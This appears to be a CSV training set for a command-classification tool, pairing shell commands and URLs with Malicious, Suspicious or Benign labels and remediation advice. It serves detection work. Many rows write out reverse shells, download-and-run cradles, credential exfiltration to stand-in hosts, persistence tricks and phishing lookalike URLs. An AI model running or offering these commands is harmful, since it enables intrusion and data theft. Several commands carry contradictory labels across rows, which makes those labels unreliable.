input_text,target_text
"analyze: schtasks /create /tn ""Update"" /tr ""C:\mal.exe"" /sc minute /mo 5",Malicious - Schedules a task to execute a suspicious executable repeatedly. Recommendation: Remove the task and investigate 'mal.exe' for malicious behavior.
analyze: ftp -n -v attacker.com < script.txt,Malicious - Automated FTP session could be used to exfiltrate data. Recommendation: Block outbound FTP and analyze 'script.txt'.
analyze: python -m http.server 8080,Malicious - May be used to serve payloads or stolen data over HTTP. Recommendation: Check what is being served and block unauthorized web servers.
analyze: echo evil >> ~/.bashrc,Malicious - Appends malicious code to bash startup file for persistence. Recommendation: Review .bashrc and remove unauthorized entries.
"analyze: (New-Object Net.WebClient).DownloadFile('http://attackserver.com/shell.exe','shell.exe')",Malicious - Downloads a binary file which could be malware. Recommendation: Delete the file and block the attacker's domain.
analyze: curl http://example.com,Suspicious - Curl command to access an external site without explanation. Recommendation: Check if the domain is trusted and restrict if unnecessary.
analyze: whoami,"Suspicious - Benign by itself, but could indicate recon if followed by other commands. Recommendation: Correlate with other actions before labeling as malicious."
analyze: ping 8.8.8.8,"Suspicious - Network reachability test, might be part of a larger script. Recommendation: Monitor for patterns of abuse or data exfiltration."
analyze: netstat -ano,"Suspicious - Checks active network connections, often used during reconnaissance. Recommendation: Audit process behavior and correlate with unusual traffic."
analyze: dir C:\,"Suspicious - Lists root directory contents, could be probing file structure. Recommendation: Track frequency and context of use."
analyze: set,"Suspicious - Reveals all environment variables, sometimes used for credential hunting. Recommendation: Review for sensitive tokens or secrets exposure."
analyze: ls -la /etc/,Suspicious - Listing sensitive configuration directories; may indicate reconnaissance. Recommendation: Audit user activity and limit shell access.
analyze: tasklist,"Suspicious - Retrieves all running processes, often used for discovery by attackers. Recommendation: Log process usage and alert on suspicious enumeration."
analyze: Get-Process,"Suspicious - PowerShell variant to list processes, common in recon scripts. Recommendation: Allow but monitor frequency across systems."
"analyze: curl -X POST -d ""data=test"" http://unknown.io/api",Suspicious - Sends POST data to an unfamiliar domain. Recommendation: Review the domain and inspect data exfiltration possibility.
analyze: nc -zv 192.168.1.1 1-1000,Suspicious - Performs a port scan; could be an internal threat or misconfiguration. Recommendation: Restrict port scanning tools and alert on similar patterns.
analyze: find / -name '*.pem',Suspicious - Searches for private keys on the file system. Recommendation: Alert and verify access permissions on sensitive files.
analyze: crontab -l,Suspicious - Lists scheduled tasks; used in recon or privilege escalation. Recommendation: Review crontab entries for anomalies.
analyze: ps aux | grep root,Suspicious - Checks processes running as root; potential enumeration. Recommendation: Investigate user intent and system behavior.
analyze: Get-WmiObject Win32_UserAccount,Suspicious - Retrieves user accounts; might be part of privilege escalation. Recommendation: Audit the execution and check user context.
analyze: cat /etc/shadow,Suspicious - Accessing hashed passwords is typically unauthorized. Recommendation: Alert and investigate potential privilege escalation.
analyze: ls -l /home/user,Benign - Standard command to list files with details in a directory. Recommendation: No action required.
analyze: cd /var/log,"Benign - Changes directory to access system logs, a routine task. Recommendation: No action necessary."
analyze: python3 script.py,Benign - Runs a local Python script; typical in development workflows. Recommendation: Ensure the script is safe and monitored.
analyze: git clone https://github.com/user/repo.git,Benign - Clones a GitHub repository; common developer action. Recommendation: No concern unless from an untrusted source.
analyze: mkdir new_folder,Benign - Creates a new directory; benign system operation. Recommendation: No action needed.
analyze: echo 'Hello World',Benign - Outputs a simple string; often used for testing or scripting. Recommendation: No action required.
analyze: ping localhost,Benign - Tests local network stack; commonly used for diagnostics. Recommendation: No concern.
analyze: Get-Help Get-Process,Benign - Requests help documentation for a PowerShell command. Recommendation: Safe and useful for users learning commands.
analyze: date,Benign - Displays the current date and time. Recommendation: No action needed.
analyze: ipconfig,Benign - Displays network configuration; useful for troubleshooting. Recommendation: Allowed by most system policies.
analyze: man ls,Benign - Displays manual page for 'ls' command. Recommendation: Benign activity.
analyze: sudo apt update,Benign - Updates package list on a Linux system; typical maintenance. Recommendation: No action necessary.
analyze: hostname,Benign - Returns the system hostname; standard usage. Recommendation: No action needed.
analyze: whoami,Benign - Displays current user; helpful for scripting and user checks. Recommendation: No issue.
analyze: systeminfo,Benign - Retrieves system information for troubleshooting. Recommendation: Benign unless combined with other suspicious behavior.
analyze: pwd,Benign - Displays current working directory. Recommendation: No concern.
analyze: clear,Benign - Clears the terminal screen. Recommendation: Safe to use.
analyze: curl http://data-stealer.biz/steal.sh | sh,"Malicious - Downloads a data-exfiltration script from a suspicious source. Recommendation: Block the domain, investigate system logs for outgoing connections."
analyze: wget http://hackerportal.org/trojan.exe -O trojan.exe && ./trojan.exe,Malicious - Downloads and executes a known trojan executable. Recommendation: Quarantine the file and review system activity.
analyze: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousupdate.co/fakeupdate.ps1'),Malicious - Runs PowerShell to fetch remote code without validation. Recommendation: Block outbound PowerShell traffic and isolate the machine.
analyze: certutil -urlcache -split -f http://phishing.site/payload.bin bad.exe,Malicious - Abuses certutil to download an executable payload. Recommendation: Alert on similar certutil usage and remove bad.exe.
analyze: http://update-vpn-settings.net,Malicious - Spoofed phishing URL attempting to mimic VPN update service. Recommendation: Warn users and block the URL at the proxy.
analyze: http://microsoft-verification.site/login,Malicious - Phishing page impersonating Microsoft login. Recommendation: Blackhole the domain and inform targeted users.
analyze: powershell.exe -EncodedCommand aGVsbG8gd29ybGQ=,Malicious - Encoded PowerShell command may hide obfuscated code. Recommendation: Decode and analyze the payload before allowing.
"analyze: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d ""badscript.exe""",Malicious - Creates registry persistence with suspicious executable. Recommendation: Delete registry entry and block 'badscript.exe'.
analyze: bash -i >& /dev/tcp/evilhost.com/1337 0>&1,Malicious - Reverse shell using bash and TCP redirection. Recommendation: Trace back IP and terminate connections.
analyze: http://login.dropbox-checker.com,Malicious - Fake Dropbox login page used for credential harvesting. Recommendation: Block the domain and reset any compromised accounts.
analyze: cmd.exe /c bitsadmin /transfer evil http://malicious.io/evil.exe C:\temp\evil.exe,Malicious - Abuses BITS to download and store malware silently. Recommendation: Disable bitsadmin tool in policy.
analyze: mshta http://fakepopup.com/alert.hta,Malicious - Executes a malicious HTA script via mshta. Recommendation: Block HTA files and monitor mshta usage.
analyze: http://secure-bank-login.net,Malicious - Spoofs a financial institution for phishing credentials. Recommendation: Blacklist and report the phishing site.
analyze: nc attacker.net 4444 -e /bin/sh,Malicious - Netcat reverse shell connecting to remote attacker. Recommendation: Kill session and restrict netcat usage.
analyze: http://login-confirm-gmail.com,Malicious - Impersonates Google login page to steal credentials. Recommendation: Notify users and block domain.
analyze: Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('http://payloads.evil/runme.ps1') },Malicious - Remote execution of malicious PowerShell script. Recommendation: Prevent remote execution policies in org settings.
analyze: ftp ftp.badactor.com,Malicious - Connects to unauthorized FTP potentially used for exfiltration. Recommendation: Restrict FTP access unless explicitly needed.
analyze: http://winupdate-service.net/install,Malicious - Spoofs legitimate Windows update to distribute malware. Recommendation: Immediately quarantine endpoints accessing it.
"analyze: python3 -c 'import socket,subprocess,os;...'",Malicious - Python one-liner reverse shell often used in payloads. Recommendation: Trace execution context and block attacker IP.
analyze: http://onedrive-share.cloud/auth,Malicious - Masquerades as OneDrive to lure credentials. Recommendation: Blacklist domain and educate users on phishing indicators.
analyze: curl -s http://badcdn.net/jsloader.js | node,Malicious - Downloads JavaScript and executes with Node.js. Recommendation: Restrict node to signed scripts.
analyze: curl http://192.168.2.50/evil.jpg | bash,Malicious - Downloads 'image' likely hiding a script for execution. Recommendation: Flag file mismatch and terminate process.
analyze: powershell -exec bypass -File ransomware.ps1,Malicious - Executes potentially destructive ransomware script. Recommendation: Disconnect host and recover from backups.
analyze: http://update-adobe-service.com/install_flash,Malicious - Mimics Adobe Flash update to install malware. Recommendation: Revoke access and block URL.
analyze: http://auth-icloud-login.net,Malicious - Phishing page targeting Apple IDs. Recommendation: Reset affected credentials and block domain.
analyze: scp user@192.168.100.2:/tmp/rootkit /usr/local/bin/,Malicious - Transfers a possible rootkit via SCP. Recommendation: Reimage system and rotate credentials.
analyze: http://secure-sso-check.org,Malicious - Fake SSO login often used for phishing. Recommendation: Block traffic and alert users.
analyze: Get-Content secrets.txt | Invoke-WebRequest -Uri http://leak.me/upload -Method POST,Malicious - Leaking sensitive file contents to attacker-controlled site. Recommendation: Alert and inspect other outbound exfiltration attempts.
analyze: http://githubusercontent.download/mal.js,Malicious - Malicious script hosted on spoofed GitHub domain. Recommendation: Block fake mirrors and confirm source.
analyze: echo 'cmd.exe' >> startup.bat,Malicious - Modifies startup script to include shell execution. Recommendation: Revert startup modifications.
analyze: http://support.microsoft-win.net,Malicious - Phishing site mimicking Microsoft support. Recommendation: Blacklist and monitor DNS logs.
analyze: wget http://haxx0r.biz/payload -O - | bash,Malicious - Downloads unknown binary and pipes to shell. Recommendation: Disable auto-pipe commands in shell configs.
analyze: smbclient \\192.168.56.101\share -U eviluser,Malicious - Accessing internal share with suspicious user. Recommendation: Audit SMB share permissions.
analyze: http://webclient-updates.com,Malicious - Another phishing domain impersonating web apps. Recommendation: Add to threat intelligence feed.
analyze: curl http://backconnect.cc/payload | bash,Malicious - Backconnect shell installer from known C2. Recommendation: Blacklist and trace download origin.
analyze: echo 'powershell malware.ps1' >> login.bat,Malicious - Injects malicious script into login batch file. Recommendation: Check user logon scripts.
analyze: http://vpn-verification.net/login,Malicious - Fake VPN login designed to steal enterprise credentials. Recommendation: Block domain and alert IT security.
analyze: curl http://unknowncdn.com/resource.js,Suspicious - Accesses an unfamiliar domain to retrieve scripts. Recommendation: Verify domain reputation.
analyze: ping google.com,Suspicious - May be used for connectivity test or to script connectivity logic. Recommendation: Context needed to assess legitimacy.
analyze: nc -vz 10.0.0.2 1-1024,Suspicious - Scanning open ports; often used in recon. Recommendation: Restrict outbound scanning behavior.
analyze: cat ~/.aws/credentials,Suspicious - Reads sensitive credentials file; depends on user context. Recommendation: Check access logs and rotate keys.
analyze: ls -la /etc/ssh,Suspicious - Listing sensitive SSH config directory. Recommendation: Review file access permissions.
analyze: whoami && hostname,Suspicious - Combined command used to confirm user and host; may be normal or suspicious. Recommendation: Correlate with execution source.
analyze: echo 'test' > /tmp/debug,Suspicious - Writing to a temp file; depends on context. Recommendation: Ensure temp files are used appropriately.
analyze: powershell Get-ChildItem -Recurse,Suspicious - Recursive listing of files; might be used in file discovery. Recommendation: Monitor for excessive enumeration.
analyze: http://192.168.100.10:8080/api/receive,Suspicious - Custom IP-based HTTP endpoint; requires validation. Recommendation: Check for potential data exfiltration.
analyze: ipconfig /all,Suspicious - Gathering detailed network config. Recommendation: Allowed if legitimate admin; otherwise flag.
analyze: netstat -anob,Suspicious - Examines all network connections and associated binaries. Recommendation: Audit process creating connections.
analyze: ssh user@10.10.10.10,Suspicious - SSH connection to internal host; check legitimacy. Recommendation: Alert on unusual SSH traffic.
analyze: python3 -m http.server 8000,Suspicious - Spins up HTTP server; could serve data for exfil. Recommendation: Monitor use of dev servers.
analyze: find / -name '*.log',Suspicious - Searching for logs system-wide. Recommendation: Verify if used for troubleshooting or abuse.
analyze: Get-ADUser -Filter *,Suspicious - Enumerates all AD users via PowerShell. Recommendation: Verify privileges and intent.
analyze: Get-Command *,Suspicious - Lists all available PowerShell commands. Recommendation: Check user role and command origin.
analyze: lsattr -a,Suspicious - Lists file attributes; used in forensic review or hiding files. Recommendation: Verify script or tool context.
analyze: scp /etc/shadow user@10.0.0.3:/tmp/,Suspicious - Suspicious attempt to copy sensitive password hashes. Recommendation: Alert and inspect the target machine.
analyze: http://devtoolkit.cloud/callback,Suspicious - Custom endpoint not on approved domain list. Recommendation: Check app behavior and allow only trusted domains.
analyze: curl -k https://unknowncert.com/data,Suspicious - Forces ignore of certificate check on HTTPS site. Recommendation: Block curl usage without cert validation.
analyze: telnet 172.16.0.1 25,Suspicious - Legacy tool used to manually probe SMTP port. Recommendation: Restrict telnet access.
analyze: Get-EventLog -LogName Security,Suspicious - Retrieves security log; can be used for covering tracks. Recommendation: Check user authorization.
analyze: bash -c 'ls /root',Suspicious - Running commands as root; investigate privilege escalation. Recommendation: Alert and review user privileges.
analyze: http://internal-api.test.local/health,Suspicious - May be part of a legit microservice but check referrer. Recommendation: Restrict internal API access.
analyze: Get-Credential,Suspicious - Prompts for credentials in script; may be for misuse. Recommendation: Audit script source.
analyze: cat /proc/version,Suspicious - Check kernel version; often used in vuln detection. Recommendation: Monitor frequency.
analyze: wget --no-check-certificate https://badssl.com,"Suspicious - Bypasses cert validation, which is risky. Recommendation: Enforce certificate checks."
analyze: ftp ftp.suspicious.org,Suspicious - Unencrypted data transfer to unfamiliar host. Recommendation: Block FTP unless whitelisted.
analyze: sudo -l,Suspicious - Checks sudo permissions; common in privilege enumeration. Recommendation: Alert if from low-privilege users.
analyze: http://iot-control-device.local/config,Suspicious - IOT local device configuration access. Recommendation: Review device IP and firmware.
analyze: dir /s /b C:\,Suspicious - Lists all files on C: drive recursively; can be suspicious. Recommendation: Audit command usage.
analyze: http://customendpoint.net/post,Suspicious - Unrecognized HTTP POST endpoint. Recommendation: Validate if it's a sanctioned service.
analyze: cat /etc/hosts,"Suspicious - View of hostname-IP mapping; usually safe, context-dependent. Recommendation: Check for tampering."
analyze: ls -la /var/www,Suspicious - Access to web directory; could be audit or prep for defacement. Recommendation: Inspect web file permissions.
analyze: ls -lh,Benign - Lists files with sizes and human-readable format. Recommendation: No action needed.
analyze: echo Hello World,Benign - Prints a simple message to console. Recommendation: No concern.
analyze: cd /var/log,Benign - Changes directory to system logs. Recommendation: No action required.
analyze: ping localhost,Benign - Checks local network stack. Recommendation: Safe command.
analyze: ifconfig,Benign - Displays network interfaces (Linux). Recommendation: Benign usage.
analyze: Get-Process,Benign - Lists all processes in PowerShell. Recommendation: Legitimate system admin activity.
analyze: mkdir reports,Benign - Creates a new directory. Recommendation: No issue.
analyze: hostname,Benign - Displays machine name. Recommendation: Normal system interaction.
analyze: date,Benign - Displays current system date. Recommendation: Benign.
analyze: man curl,Benign - Reads manual page for curl command. Recommendation: No concern.
analyze: top,Benign - Shows system resource usage. Recommendation: Legitimate tool use.
analyze: tasklist,Benign - Displays running tasks on Windows. Recommendation: Benign unless excessive.
analyze: whoami,Benign - Returns current user ID. Recommendation: Normal command.
analyze: systeminfo,Benign - Provides Windows system specs. Recommendation: Used for basic diagnostics.
analyze: sudo apt update,Benign - Updates package index in Ubuntu. Recommendation: Normal maintenance.
analyze: git pull,Benign - Updates local repository from remote. Recommendation: Expected in dev environments.
analyze: cat /etc/os-release,Benign - Displays OS version info. Recommendation: Routine diagnostics.
analyze: Get-Date,Benign - PowerShell to display date. Recommendation: Benign use.
analyze: ps -aux,Benign - Lists running Linux processes. Recommendation: Normal operation.
analyze: npm install,Benign - Installs packages for JavaScript project. Recommendation: Standard dev action.
analyze: brew update,Benign - Homebrew command to update formulas. Recommendation: Expected system upkeep.
analyze: pip install requests,Benign - Installs Python library. Recommendation: Normal for developers.
analyze: lsblk,Benign - Lists block devices. Recommendation: Safe unless abused.
analyze: clear,Benign - Clears terminal screen. Recommendation: No risk.
analyze: df -h,Benign - Shows disk usage. Recommendation: Typical admin tool.
analyze: python3 my_script.py,Benign - Runs a user script. Recommendation: Safe depending on context.
analyze: Get-Help Get-Command,Benign - Requests help in PowerShell. Recommendation: No action needed.
analyze: uptime,Benign - Checks system load time. Recommendation: Benign command.
analyze: ls /tmp,Benign - Lists temporary directory files. Recommendation: Common task.
analyze: echo $PATH,Benign - Displays environment PATH variable. Recommendation: Safe use.
analyze: touch testfile.txt,Benign - Creates an empty text file. Recommendation: No concern.
analyze: Get-ChildItem,Benign - Lists directory content in PowerShell. Recommendation: Benign.
analyze: cd ~/projects,Benign - Navigates to user projects folder. Recommendation: No action needed.
analyze: curl http://evilpayloads.cc/inject.sh | bash,"Malicious - Fetches and executes a shell script from a known malicious domain. Recommendation: Terminate execution, block domain, and scan system."
analyze: wget http://ransom-node.net/encryptor.py -O /tmp/encryptor.py && python3 /tmp/encryptor.py,"Malicious - Downloads ransomware script for execution. Recommendation: Quarantine system, inspect encrypted files, and restore from backups."
analyze: powershell -enc SQBFAFgAcAAgAC0AbgBwACAAaAB0AHQAcAA6AC8ALwBtAGkAcwBoAGEAcgBkAC4AYwBvAG0ALwBwAHkALgBzAHEA,Malicious - Obfuscated PowerShell likely hiding malicious intent. Recommendation: Decode and inspect the script before allowing.
analyze: http://fake-google-auth.net,Malicious - Spoofed Google login phishing URL. Recommendation: Blackhole domain and notify potentially affected users.
analyze: bash -i >& /dev/tcp/malnode.io/9090 0>&1,"Malicious - Establishes reverse shell connection to remote host. Recommendation: Block IP, terminate session, and isolate machine."
analyze: certutil -f -urlcache -split http://badupdates.site/toolkit.exe toolkit.exe,Malicious - Leverages certutil to drop suspicious executable. Recommendation: Delete file and block domain.
analyze: http://drive-access-login.info,Malicious - Phishing link posing as Google Drive access page. Recommendation: Warn users and prevent access through email filters.
analyze: scp attacker@evilhost:/var/data/malware /usr/bin,Malicious - Transfers and stores malware to system directory. Recommendation: Audit all file transfers and inspect 'malware'.
analyze: echo 'bash -i >& /dev/tcp/10.10.0.1/9001 0>&1' >> ~/.bashrc,Malicious - Adds reverse shell to shell initialization file. Recommendation: Delete script line and scan for persistence.
"analyze: python3 -c 'import os; os.system(""curl http://cnc.botnet.biz/sh"")'",Malicious - Uses Python to fetch and execute remote shell script. Recommendation: Disable remote command execution and check outbound logs.
analyze: Invoke-WebRequest -Uri http://loadremote.com/evil.ps1 -OutFile evil.ps1; ./evil.ps1,Malicious - Downloads and executes a PowerShell script. Recommendation: Isolate system and examine script content.
"analyze: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Ransom /t REG_SZ /d ""C:\malware.exe""",Malicious - Persists ransomware binary through registry autorun. Recommendation: Remove autorun key and inspect malware.exe.
analyze: nc -e cmd.exe attacker.com 9999,Malicious - Reverse shell from Windows to attacker server. Recommendation: Kill shell process and restrict outgoing ports.
analyze: http://microsoft-reset-password.net,Malicious - Impersonates Microsoft to capture passwords. Recommendation: Blacklist domain and notify affected parties.
analyze: curl -s http://botnets.infected/api | bash,Malicious - Silent download and execution of botnet payload. Recommendation: Trace process and firewall C2 endpoint.
analyze: echo 'powershell iex(iwr http://bad.ps1)' >> startup.ps1,Malicious - Modifies startup to include malicious PowerShell command. Recommendation: Remove command and validate registry or autorun paths.
analyze: ftp -n -s:ftp_upload_script.txt attacker.site,Malicious - Automated FTP upload to malicious server. Recommendation: Block unauthorized FTP transfers.
analyze: http://adobe-flash-fakeupdate.org,Malicious - Phishing page disguised as Adobe Flash updater. Recommendation: Prevent access and scan system for fake installers.
analyze: wget http://injectthis.com/script.sh -O - | bash,Malicious - Pipe unknown remote script directly to shell. Recommendation: Disable auto-pipe execution logic in scripts.
analyze: http://icloud-authentic-login.org,Malicious - Phishing site for Apple account credentials. Recommendation: Blacklist site and rotate exposed credentials.
analyze: Get-Content creds.txt | curl -d @- http://exfiltrate.me,Malicious - Attempts to send credential file contents to an external server. Recommendation: Monitor for other leaks and alert security team.
"analyze: (New-Object Net.WebClient).DownloadFile('http://hackerhub.com/file.exe','C:\temp\file.exe')",Malicious - Downloads unknown executable using PowerShell. Recommendation: Analyze binary and restrict outbound scripts.
analyze: schtasks /create /tn Backdoor /tr 'C:\hidden\bd.exe' /sc minute /mo 1,Malicious - Creates frequent task running hidden binary. Recommendation: Disable task and inspect bd.exe.
analyze: cmd /c reg import C:\ransom.reg,Malicious - Imports registry entries likely tied to ransomware. Recommendation: Inspect the .reg file for harmful modifications.
analyze: http://githubsecurity-checks.net,Malicious - Fake GitHub page for phishing or malware delivery. Recommendation: Block domain and educate developers.
analyze: Set-MpPreference -ExclusionPath 'C:\Users\Public\',Malicious - Disables AV scanning on public folder to hide payloads. Recommendation: Revert exclusions and scan target directory.
analyze: echo 'curl http://evilscript.sh | bash' >> ~/.bash_profile,Malicious - Persists malicious download in user profile. Recommendation: Remove line and verify shell integrity.
analyze: scp evil.sh user@remotehost:/etc/init.d/,Malicious - Deploys potentially malicious script into init directory. Recommendation: Validate remote system and remove script.
analyze: http://support-microsoft-auth.net,Malicious - Spoofs Microsoft technical support login. Recommendation: Prevent access via DNS sinkhole.
analyze: wget -q http://badsite.org/injector && bash injector,Malicious - Quietly fetches and runs an unknown injector file. Recommendation: Review download history and terminate processes.
analyze: curl http://backup-breach.me/extract.sh | bash,Malicious - Fetches extraction script likely exfiltrating data. Recommendation: Alert SOC and block remote access.
analyze: echo 'mshta http://roguesite.com/script.hta' >> login.bat,Malicious - Injects rogue HTA execution into login script. Recommendation: Clean login.bat and monitor for persistence.
analyze: http://sso-login-dropbox.net,Malicious - Phishing portal mimicking Dropbox SSO login. Recommendation: Blacklist and trace access attempts.
analyze: http://securelogin-authenticator.net,Malicious - Spoofed SSO portal used for credential theft. Recommendation: Educate users and block domain.
"analyze: powershell -command ""IEX((New-Object Net.WebClient).DownloadString('http://hijack.com/start.ps1'))""",Malicious - Runs hijacked script via PowerShell. Recommendation: Investigate script and restrict dynamic loading.
analyze: netstat -an,Suspicious - Monitors all network connections; may be used for scanning or troubleshooting. Recommendation: Audit user running the command.
analyze: ls -laR /,Suspicious - Recursively lists all files; often used in recon or large file collection. Recommendation: Track and evaluate frequency.
analyze: powershell Get-Service,Suspicious - Enumerates services; contextually safe or suspicious. Recommendation: Monitor and correlate with session logs.
analyze: Get-WmiObject Win32_Process,Suspicious - Used to enumerate processes on remote/local systems. Recommendation: Confirm admin purpose.
analyze: whoami && net user,Suspicious - Checks user identity and enumerates users; may be part of enumeration. Recommendation: Review script source.
analyze: curl -X GET http://untrusted.api.io/data,Suspicious - Makes a request to an unfamiliar endpoint. Recommendation: Validate endpoint domain.
analyze: ftp ftp.unknownhost.com,Suspicious - Unsecured file transfer to unknown host. Recommendation: Limit access to trusted FTP destinations.
analyze: python3 -m http.server 8088,Suspicious - Creates temporary server; needs validation. Recommendation: Allow only in trusted environments.
analyze: sudo -i,Suspicious - Switch to root shell; may be expected or suspicious. Recommendation: Confirm activity legitimacy.
analyze: Get-EventLog -LogName Application -Newest 50,Suspicious - Retrieves latest application logs. Recommendation: Review usage frequency.
analyze: http://192.168.88.3:9000/ping,Suspicious - Internal endpoint ping request; review referrer. Recommendation: Ensure endpoint is intended for service checks.
analyze: cat ~/.bash_history,Suspicious - Reads user's shell history; often done for intel gathering. Recommendation: Restrict access to history.
analyze: find / -perm -4000,Suspicious - Searches for SUID binaries; often used in privilege escalation. Recommendation: Log and alert if unnecessary.
analyze: net use \\192.168.1.100\C$ /user:admin,Suspicious - Access to administrative shares on remote system. Recommendation: Audit credentials and source.
analyze: cat /var/log/auth.log,Suspicious - Reviews auth logs; can be benign or abused. Recommendation: Audit user access.
analyze: ssh root@192.168.0.5,Suspicious - Remote access as root; risky if not authorized. Recommendation: Alert if out of policy.
analyze: ps -ef | grep sshd,Suspicious - Checks for SSH sessions; context-specific. Recommendation: Evaluate command sequence.
analyze: lsattr /etc/passwd,Suspicious - Checks file attributes of critical files. Recommendation: Check for signs of tampering.
analyze: http://debug.local/testapi,Suspicious - Local API endpoint access; validate use. Recommendation: Whitelist internal domains.
analyze: uname -a,Suspicious - Gathers kernel and system info. Recommendation: Correlate with script origin.
analyze: env,Suspicious - Lists all environment variables; used in scripting and info collection. Recommendation: No immediate action.
analyze: df -Th,Suspicious - Disk usage and filesystem type; benign unless scripted. Recommendation: Confirm normal admin task.
analyze: ls -ld /root,Suspicious - Checks root directory access; could be exploratory. Recommendation: Audit user privileges.
analyze: http://iot-ping.local/status,Suspicious - Checks status of internal IoT service. Recommendation: Restrict access to authorized services.
analyze: Get-HotFix,Suspicious - Gets Windows hotfix information; depends on context. Recommendation: Cross-reference with patching schedule.
analyze: dir /A:D /S,Suspicious - Lists all directories recursively in Windows. Recommendation: Track script behavior.
analyze: Get-NetIPAddress,Suspicious - Retrieves all IP configs; used in recon or networking tasks. Recommendation: Validate system role.
analyze: wget https://privateapi.cloud,Suspicious - Requests data from unknown cloud endpoint. Recommendation: Inspect domain and headers.
analyze: Get-LocalGroupMember -Group Administrators,Suspicious - Checks members of admin group; can indicate escalation checks. Recommendation: Log query origin.
analyze: net accounts,Suspicious - Shows password policies and account info. Recommendation: Review logs for access context.
analyze: id,Suspicious - Returns user and group IDs; typically safe unless scripted. Recommendation: No immediate risk.
analyze: ip a,Suspicious - Shows network interfaces; safe or suspicious depending on script usage. Recommendation: Evaluate frequency of execution.
analyze: ls -lh /var,Benign - Lists files in /var with human-readable format. Recommendation: Normal usage.
analyze: echo 'Update complete',Benign - Prints message to terminal. Recommendation: No concern.
analyze: cd ~/Documents,Benign - Changes directory to user documents. Recommendation: Benign.
analyze: Get-ChildItem -Path C:\Users,Benign - Lists user directories on Windows. Recommendation: Safe.
analyze: ping 8.8.4.4,Benign - Tests Google DNS reachability. Recommendation: Standard diagnostic.
analyze: hostnamectl,Benign - Displays hostname and OS details. Recommendation: Benign.
analyze: sudo systemctl restart apache2,Benign - Restarts Apache web server. Recommendation: Legitimate admin task.
analyze: clear,Benign - Clears terminal screen. Recommendation: Safe.
analyze: date,Benign - Displays system date and time. Recommendation: Benign.
analyze: df -h,Benign - Shows disk usage. Recommendation: No action needed.
analyze: npm start,Benign - Starts Node.js application. Recommendation: Expected in dev environments.
analyze: python3 manage.py runserver,Benign - Launches Django development server. Recommendation: Benign.
analyze: top,Benign - Real-time system monitoring. Recommendation: Safe.
